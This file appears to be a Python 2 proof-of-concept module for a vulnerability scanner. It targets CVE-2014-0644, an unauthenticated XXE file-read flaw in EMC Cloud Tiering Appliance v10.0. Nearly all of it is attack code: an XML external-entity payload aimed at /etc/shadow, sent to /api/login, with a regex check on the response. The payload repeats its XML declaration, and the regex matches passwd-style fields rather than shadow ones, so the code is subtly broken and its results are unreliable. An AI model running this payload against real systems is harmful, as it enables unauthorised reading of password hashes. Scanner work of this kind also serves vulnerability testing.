# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'EMC_0000' # 平台漏洞编号
    name = 'EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XXE # 漏洞类型
    disclosure_date = '2014-04-16'  # 漏洞公布时间
    desc = '''
        EMC Cloud Tiering Appliance（CTA）是美国易安信（EMC）公司的一套基于策略的文件分层、
        归档和迁移解决方案。该方案通过自动化文件分层、文件归档和文件迁移等功能优化网络存储（NAS）基础架构。
        该架构的v10.0版本的/api/login处存在XXE漏洞，导致可以读取任意文件。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-85903' # 
    cnvd_id = 'CNVD-2014-02523' # cnvd漏洞编号
    cve_id = 'CVE-2014-0644'  # cve编号
    product = 'EMC Cloud Tiering Appliance'  # 漏洞组件名称
    product_version = 'v10.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e42ff7c8-d6b9-4962-8571-c50384646780' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            filename='/etc/shadow'
            payload=r'<?xml version="1.0" encoding="ISO-8859-1"?>'\
                 '<?xml version="1.0" encoding="ISO-8859-1"?>'\
                 '<!DOCTYPE foo ['\
                 '<!ELEMENT foo ANY >'\
                 '<!ENTITY xxe SYSTEM "file://{file}" >]>' \
                 '<Request>'\
                 '<Username>root</Username>'\
                 '<Password>root</Password>'\
                 '</Request>'.format(file=filename)

            expurl = arg + '/api/login'
            try:
                response=requests.post(expurl,data=payload, timeout=50)
                if re.match('root:.+?:0:0:.+?:.+?:.+?', response.content) and response.status_code==200:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            except Exception, e:
                self.output.info('执行异常{}'.format(e))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()